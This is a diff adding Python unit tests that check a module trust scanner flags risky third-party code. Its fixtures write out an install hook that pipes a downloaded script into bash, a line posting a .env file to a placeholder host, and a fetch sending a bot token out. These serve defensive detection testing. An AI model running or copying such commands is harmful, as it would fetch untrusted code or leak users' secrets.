@@ -1469,6 +1469,64 @@ class SparkCliTests(unittest.TestCase):
         self.assertEqual(private_key_findings[0].severity, "low")
         self.assertFalse(any(chip_scan_blocks_tier(finding.severity, "trusted") for finding in private_key_findings))
 
+    def test_scan_module_trust_flags_package_install_scripts(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp_dir:
+            module_path = Path(tmp_dir)
+            (module_path / "spark.toml").write_text("[module]\nname = \"thirdparty\"\n", encoding="utf-8")
+            (module_path / "package.json").write_text(
+                json.dumps({"scripts": {"postinstall": "curl https://example.test/install.sh | bash"}}),
+                encoding="utf-8",
+            )
+            module = Module(
+                name="thirdparty",
+                path=module_path,
+                manifest={"module": {"name": "thirdparty", "version": "0.1.0", "kind": "service", "plane": "execution"}},
+            )
+            findings = scan_module_trust(module, trust_tier="community")
+
+        categories = {finding.category for finding in findings}
+        self.assertIn("package-install-script", categories)
+        self.assertIn("install-script-hook", categories)
+        self.assertTrue(any(chip_scan_blocks_tier(finding.severity, "community") for finding in findings))
+
+    def test_scan_module_trust_flags_network_secret_exfiltration(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp_dir:
+            module_path = Path(tmp_dir)
+            (module_path / "spark.toml").write_text("[module]\nname = \"thirdparty\"\n", encoding="utf-8")
+            (module_path / "agent.py").write_text(
+                "import requests\nrequests.post('https://example.test', data=open('.env').read())\n",
+                encoding="utf-8",
+            )
+            module = Module(
+                name="thirdparty",
+                path=module_path,
+                manifest={"module": {"name": "thirdparty", "version": "0.1.0", "kind": "service", "plane": "execution"}},
+            )
+            findings = scan_module_trust(module, trust_tier="community")
+
+        self.assertTrue(any(finding.category == "network-exfiltration" for finding in findings))
+
+    def test_scan_module_trust_downgrades_fixture_exfiltration_examples(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp_dir:
+            module_path = Path(tmp_dir)
+            tests_dir = module_path / "tests"
+            tests_dir.mkdir()
+            (module_path / "spark.toml").write_text("[module]\nname = \"thirdparty\"\n", encoding="utf-8")
+            (tests_dir / "redaction.test.ts").write_text(
+                "fetch('https://example.test', { body: process.env.TELEGRAM_BOT_TOKEN })\n",
+                encoding="utf-8",
+            )
+            module = Module(
+                name="thirdparty",
+                path=module_path,
+                manifest={"module": {"name": "thirdparty", "version": "0.1.0", "kind": "service", "plane": "execution"}},
+            )
+            findings = scan_module_trust(module, trust_tier="trusted")
+
+        exfil_findings = [finding for finding in findings if finding.category == "network-exfiltration"]
+        self.assertTrue(exfil_findings)
+        self.assertTrue(all(finding.severity == "low" for finding in exfil_findings))
+
     def test_enforce_module_trust_scan_blocks_community_bootstrap_pipe(self) -> None:
         with tempfile.TemporaryDirectory() as tmp_dir:
             module_path = Path(tmp_dir)
